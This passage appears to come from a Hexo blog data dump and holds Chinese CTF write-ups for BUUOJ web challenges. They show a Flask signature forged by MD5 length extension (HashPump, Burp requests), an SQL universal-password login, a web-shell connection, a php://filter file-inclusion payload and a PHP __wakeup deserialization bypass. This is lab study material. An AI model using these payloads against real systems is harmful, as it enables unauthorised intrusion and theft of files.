class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))  <span class=\"comment\"># urllib.unquote 相当与  urldecode</span></span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class=\"comment\">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>\n<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>\n<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>\n<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>\n<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>\n<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>\n<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span>: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n&quot;}</code></p>\n<h3 id=\"0x02-另一种解法\"><a href=\"#0x02-另一种解法\" class=\"headerlink\" title=\"0x02 另一种解法\"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>\n<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>\n<p>求<code>（secret+flag.txt+scanread）</code></p>\n<p>经过测试密钥是16位 加上scanread是24位。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:/tmp/HashPump<span class=\"comment\"># hashpump </span></span><br><span class=\"line\">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class=\"line\">Input Data: scan   <span class=\"comment\">#写上原有数据</span></span><br><span class=\"line\">Input Key Length: 24    <span class=\"comment\">#密钥长度+数据长度+拓展的数据长度</span></span><br><span class=\"line\">Input Data to Add: <span class=\"built_in\">read</span>   <span class=\"comment\">#拓展的数据</span></span><br><span class=\"line\">46a6ff04f7bede58de30e93410935976 <span class=\"comment\">#生成的MD5</span></span><br><span class=\"line\">scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p><code>burp suite</code>提交的数据</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/De1ta?param=flag.txt</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\">Cookie:action=scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign=46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>\n\n<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n&quot;}</code></p>"},{"title":"buuoj刷题记录6-极客大挑战web1","date":"2020-01-02T12:49:17.000Z","_content":"\n# 极客大挑战web\n\n### Havefun\n\n查看源码,发现提示\n\n```html\n                <!--\n        $cat=$_GET['cat'];\n        echo $cat;\n        if($cat=='dog'){\n            echo 'Syc{cat_cat_cat_cat}';\n        }\n        -->\n```\n\npayload=`?cat=dog`\n\n<!--more-->\n\n![](/pic/9.png)\n\n### EasySQL\n\n万能密码直接获取结果\n\n![](/pic/10.png)\n\n### Knife\n\n使用菜刀或者蚁剑连接 密码Syc\n\n![](/pic/11.png)\n\nflag在根目录下\n\n### Secret File\n\n查看源码\n\n```html\n<!DOCTYPE html>\n\n<html>\n\n<style type=\"text/css\" >\n#master {\n    position:absolute;\n    left:44%;\n    bottom:0;\n    text-align :center;\n        }\n        p,h1 {\n                cursor: default;\n        }\n</style>\n\n        <head>\n                <meta charset=\"utf-8\">\n                <title>蒋璐源的秘密</title>\n        </head>\n\n        <body style=\"background-color:black;\"><br><br><br><br><br><br>\n\n            <h1 style=\"font-family:verdana;color:red;text-align:center;\">你想知道蒋璐源的秘密么？</h1><br><br><br>\n\n            <p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\">想要的话可以给你，去找吧！把一切都放在那里了！</p>\n            <a id=\"master\" href=\"./Archive_room.php\" style=\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\">Oh! You found me</a>\n            <div style=\"position: absolute;bottom: 0;width: 99%;\"><p align=\"center\" style=\"font:italic 15px Georgia,serif;color:white;\"> Syclover @ cl4y</p></div>\n        </body>\n</html>\n```\n\n点击其中的链接\n\n```html\n<!DOCTYPE html>\n\n<html>\n\n<style type=\"text/css\" >\n#master\t{\n    position:absolute;\n    left:44%;\n    bottom:20;\n    text-align :center;\n    \t}\n        p,h1 {\n                cursor: default;\n        }\n</style>\n\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<title>绝密档案</title>\n\t</head>\n\n\t<body style=\"background-color:black;\"><br><br><br><br><br><br>\n\t\t\n\t\t<h1 style=\"font-family:verdana;color:red;text-align:center;\">\n\t\t我把他们都放在这里了，去看看吧\t\t<br>\n\t\t</h1><br><br><br><br><br><br>\n\t\t<a id=\"master\" href=\"./action.php\" style=\"background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;\">\n\t\t\t<font size=6>SECRET</font>\n\t\t</a>\n\t<div style=\"position: absolute;bottom: 0;width: 99%;\"><p align=\"center\" style=\"font:italic 15px Georgia,serif;color:white;\"> Syclover @ cl4y</p></div>\n\t</body>\n\n</html>\n```\n\n再次点击链接\n\n```html\n<!DOCTYPE html>\n\n<html>\n<style>\n        p,h1 {\n                cursor: default;\n        }\n</style>\n\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<title>END</title>\n\t</head>\n\n\t<body style=\"background-color:black;\"><br><br><br><br><br><br>\n\t\t\n\t\t<h1 style=\"font-family:verdana;color:red;text-align:center;\">查阅结束</h1><br><br><br>\n\t\t\n\t\t<p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\">没看清么？回去再仔细看看吧。</p>\n\t\t<div style=\"position: absolute;bottom: 0;width: 99%;\"><p align=\"center\" style=\"font:italic 15px Georgia,serif;color:white;\"> Syclover @ cl4y</p></div>\n\t</body>\n\n</html>\n```\n\n和之前南邮cft的一道web有点像\n\n直接上burp suite\n\n一直点，查看记录，发现有一个\n\n![](/pic/12.png)\n\n打开发现源码\n\n```php+HTML\n<html>\n    <title>secret</title>\n    <meta charset=\"UTF-8\">\n<?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    $file=$_GET['file'];\n    if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n        echo \"Oh no!\";\n        exit();\n    }\n    include($file); \n//flag放在了flag.php里\n?>\n</html>\n```\n\n`payload：?file=php://filter/read=convert.base64-encode/resource=./flag.php`\n\n将得到的base64解码\n\n```php+HTML\n<!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"utf-8\">\n        <title>FLAG</title>\n    </head>\n\n    <body style=\"background-color:black;\"><br><br><br><br><br><br>\n        \n        <h1 style=\"font-family:verdana;color:red;text-align:center;\">ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~</h1><br><br><br>\n        \n        <p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\">\n            <?php\n                echo \"æå°±å¨è¿é\";\n                $flag = 'flag{d144e819-346a-49ab-98e7-2fea0b2b9f6d}';\n                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'\n            ?>\n        </p>\n    </body>\n\n</htmlPgo\n```\n\n### PHP\n\n常规扫描手工or御剑，发现`www.zip`存在源码\n\nclass.php\n\n```php\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';    //此处需要绕过\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n\n            \n        }\n    }\n}\n\n$a=new Name('admin',100);\n\nvar_dump(serialize($a));\n\n?>\n```\n\nindex.php中关键代码\n\n```php\n <?php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n    ?>\n```\n\nflag.php\n\n```php\n<?php\n$flag = 'Syc{dog_dog_dog_dog}';\n?>\n```\n\n分析后这是一个序列化+绕过`__wakeup()`  \n\n`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。\n\n`serialize()` 会检查是否存在一个 `__sleep()` 方法。如果存在，则会先调用 `__sleep()` 。\n\n`CVE-2016-7124`提到`unserialize()` 绕过`__wakeup()`的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。\n\n```php\n<?php\nclass Name{\n    private $username = 'admin';\n    private $password = 100;\n\n}\n$a=new Name();\nvar_dump(urlencode(serialize($a))); //O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D\nvar_dump(serialize($a));//O:4:\"Name\":2:{s:14:\"�Name�username\";s:5:\"admin\";s:14:\"�Name�password\";i:100;}   \n?>\n```\n\n因为有不可打印字符，所以选择经过URL编码后的\n\n`payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`\n\n![](/pic/13.png)\n\n","source":"_posts/buuoj刷题记录6-极客大挑战web1.md","raw":"---\ntitle: buuoj刷题记录6-极客大挑战web1\ndate: 2020-01-02 20:49:17\ntags:\n- ctf\n- 极客大挑战\n- web\ncategories: \n - 刷题记录\n---\n\n# 极客大挑战web\n\n### Havefun\n\n查看源码,发现提示\n\n```html\n                <!--\n        $cat=$_GET['cat'];\n        echo $cat;\n        if($cat=='dog'){\n            echo 'Syc{cat_cat_cat_cat}';\n        }\n        -->\n```\n\npayload=`?cat=dog`\n\n<!--more-->\n\n![](/pic/9.png)\n\n### EasySQL\n\n万能密码直接获取结果\n\n![](/pic/10.png)\n\n### Knife\n\n使用菜刀或者蚁剑连接 密码Syc\n\n![](/pic/11.png)\n\nflag在根目录下\n\n### Secret File\n\n查看源码\n\n```html\n<!DOCTYPE html>\n\n<html>\n\n<style type=\"text/css\" >\n#master {\n    position:absolute;\n    left:44%;\n    bottom:0;\n    text-align :center;\n        }\n        p,h1 {\n                cursor: default;\n        }\n</style>\n\n        <head>\n                <meta charset=\"utf-8\">\n                <title>蒋璐源的秘密</title>\n        </head>\n\n        <body style=\"background-color:black;\"><br><br><br><br><br><br>\n\n            <h1 style=\"font-family:verdana;color:red;text-align:center;\">你想知道蒋璐源的秘密么？</h1><br><br><br>\n\n            <p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\">想要的话可以给你，去找吧！把一切都放在那里了！</p>\n            <a id=\"master\" href=\"./Archive_room.php\" style=\"background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;\">Oh! You found me</a>\n            <div style=\"position: absolute;bottom: 0;width: 99%;\"><p align=\"center\" style=\"font:italic 15px Georgia,serif;color:white;\"> Syclover @ cl4y</p></div>\n        </body>\n</html>\n```\n\n点击其中的链接\n\n```html\n<!DOCTYPE html>\n\n<html>\n\n<style type=\"text/css\" >\n#master\t{\n    position:absolute;\n    left:44%;\n    bottom:20;\n    text-align :center;\n    \t}\n        p,h1 {\n                cursor: default;\n        }\n</style>\n\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<title>绝密档案</title>\n\t</head>\n\n\t<body style=\"background-color:black;\"><br><br><br><br><br><br>\n\t\t\n\t\t<h1 style=\"font-family:verdana;color:red;text-align:center;\">\n\t\t我把他们都放在这里了，去看看吧\t\t<br>\n\t\t</h1><br><br><br><br><br><br>\n\t\t<a id=\"master\" href=\"./action.php\" style=\"background-color:red;height:50px;width:200px;color:#FFFFFF;left:44%;\">\n\t\t\t<font size=6>SECRET</font>\n\t\t</a>\n\t<div style=\"position: absolute;bottom: 0;width: 99%;\"><p align=\"center\" style=\"font:italic 15px Georgia,serif;color:white;\"> Syclover @ cl4y</p></div>\n\t</body>\n\n</html>\n```\n\n再次点击链接\n\n```html\n<!DOCTYPE html>\n\n<html>\n<style>\n        p,h1 {\n                cursor: default;\n        }\n</style>\n\n\t<head>\n\t\t<meta charset=\"utf-8\">\n\t\t<title>END</title>\n\t</head>\n\n\t<body style=\"background-color:black;\"><br><br><br><br><br><br>\n\t\t\n\t\t<h1 style=\"font-family:verdana;color:red;text-align:center;\">查阅结束</h1><br><br><br>\n\t\t\n\t\t<p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\">没看清么？回去再仔细看看吧。</p>\n\t\t<div style=\"position: absolute;bottom: 0;width: 99%;\"><p align=\"center\" style=\"font:italic 15px Georgia,serif;color:white;\"> Syclover @ cl4y</p></div>\n\t</body>\n\n</html>\n```\n\n和之前南邮cft的一道web有点像\n\n直接上burp suite\n\n一直点，查看记录，发现有一个\n\n![](/pic/12.png)\n\n打开发现源码\n\n```php+HTML\n<html>\n    <title>secret</title>\n    <meta charset=\"UTF-8\">\n<?php\n    highlight_file(__FILE__);\n    error_reporting(0);\n    $file=$_GET['file'];\n    if(strstr($file,\"../\")||stristr($file, \"tp\")||stristr($file,\"input\")||stristr($file,\"data\")){\n        echo \"Oh no!\";\n        exit();\n    }\n    include($file); \n//flag放在了flag.php里\n?>\n</html>\n```\n\n`payload：?file=php://filter/read=convert.base64-encode/resource=./flag.php`\n\n将得到的base64解码\n\n```php+HTML\n<!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"utf-8\">\n        <title>FLAG</title>\n    </head>\n\n    <body style=\"background-color:black;\"><br><br><br><br><br><br>\n        \n        <h1 style=\"font-family:verdana;color:red;text-align:center;\">ååï¼ä½ æ¾å°æäºï¼å¯æ¯ä½ çä¸å°æQAQ~~~</h1><br><br><br>\n        \n        <p style=\"font-family:arial;color:red;font-size:20px;text-align:center;\">\n            <?php\n                echo \"æå°±å¨è¿é\";\n                $flag = 'flag{d144e819-346a-49ab-98e7-2fea0b2b9f6d}';\n                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'\n            ?>\n        </p>\n    </body>\n\n</htmlPgo\n```\n\n### PHP\n\n常规扫描手工or御剑，发现`www.zip`存在源码\n\nclass.php\n\n```php\n<?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this->username = $username;\n        $this->password = $password;\n    }\n\n    function __wakeup(){\n        $this->username = 'guest';    //此处需要绕过\n    }\n\n    function __destruct(){\n        if ($this->password != 100) {\n            echo \"</br>NO!!!hacker!!!</br>\";\n            echo \"You name is: \";\n            echo $this->username;echo \"</br>\";\n            echo \"You password is: \";\n            echo $this->password;echo \"</br>\";\n            die();\n        }\n        if ($this->username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"</br>hello my friend~~</br>sorry i can't give you the flag!\";\n            die();\n\n            \n        }\n    }\n}\n\n$a=new Name('admin',100);\n\nvar_dump(serialize($a));\n\n?>\n```\n\nindex.php中关键代码\n\n```php\n <?php\n    include 'class.php';\n    $select = $_GET['select'];\n    $res=unserialize(@$select);\n    ?>\n```\n\nflag.php\n\n```php\n<?php\n$flag = 'Syc{dog_dog_dog_dog}';\n?>\n```\n\n分析后这是一个序列化+绕过`__wakeup()`  \n\n`unserialize()` 会检查是否存在一个 `__wakeup()` 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。\n\n`serialize()` 会检查是否存在一个 `__sleep()` 方法。如果存在，则会先调用 `__sleep()` 。\n\n`CVE-2016-7124`提到`unserialize()` 绕过`__wakeup()`的方法，在序列化后对象数量声明中大于原本的的数量即可绕过。\n\n```php\n<?php\nclass Name{\n    private $username = 'admin';\n    private $password = 100;\n\n}\n$a=new Name();\nvar_dump(urlencode(serialize($a))); //O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D\nvar_dump(serialize($a));//O:4:\"Name\":2:{s:14:\"�Name�username\";s:5:\"admin\";s:14:\"�Name�password\";i:100;}   \n?>\n```\n\n因为有不可打印字符，所以选择经过URL编码后的\n\n`payload：O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D`\n\n![](/pic/13.png)\n\n","slug":"buuoj刷题记录6-极客大挑战web1","published":1,"updated":"2020-01-02T12:49:17.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssflb000mpk7e7wkv7tiz","content":"<h1 id=\"极客大挑战web\"><a href=\"#极客大挑战web\" class=\"headerlink\" title=\"极客大挑战web\"></a>极客大挑战web</h1><h3 id=\"Havefun\"><a href=\"#Havefun\" class=\"headerlink\" title=\"Havefun\"></a>Havefun</h3><p>查看源码,发现提示</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">        <span class=\"comment\">&lt;!--</span></span><br><span class=\"line\"><span class=\"comment\">$cat=$_GET['cat'];</span></span><br><span class=\"line\"><span class=\"comment\">echo $cat;</span></span><br><span class=\"line\"><span class=\"comment\">if($cat=='dog')&#123;</span></span><br><span class=\"line\"><span class=\"comment\">    echo 'Syc&#123;cat_cat_cat_cat&#125;';</span></span><br><span class=\"line\"><span class=\"comment\">&#125;</span></span><br><span class=\"line\"><span class=\"comment\">--&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>payload=<code>?cat=dog</code></p>\n<a id=\"more\"></a>\n\n<p><img src=\"/pic/9.png\" alt=\"\"></p>\n<h3 id=\"EasySQL\"><a href=\"#EasySQL\" class=\"headerlink\" title=\"EasySQL\"></a>EasySQL</h3><p>万能密码直接获取结果</p>\n<p><img src=\"/pic/10.png\" alt=\"\"></p>\n<h3 id=\"Knife\"><a href=\"#Knife\" class=\"headerlink\" title=\"Knife\"></a>Knife</h3><p>使用菜刀或者蚁剑连接 密码Syc</p>\n<p><img src=\"/pic/11.png\" alt=\"\"></p>\n<p>flag在根目录下</p>\n<h3 id=\"Secret-File\"><a href=\"#Secret-File\" class=\"headerlink\" title=\"Secret File\"></a>Secret File</h3><p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/css\"</span> &gt;</span></span><br><span class=\"line\"><span class=\"css\"><span class=\"selector-id\">#master</span> &#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">position</span><span class=\"selector-pseudo\">:absolute</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">left</span><span class=\"selector-pseudo\">:44</span>%;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">bottom</span><span class=\"selector-pseudo\">:0</span>;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">text-align</span> <span class=\"selector-pseudo\">:center</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        p,h1 &#123;</span><br><span class=\"line\">                cursor: default;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>蒋璐源的秘密<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">body</span> <span class=\"attr\">style</span>=<span class=\"string\">\"background-color:black;\"</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span 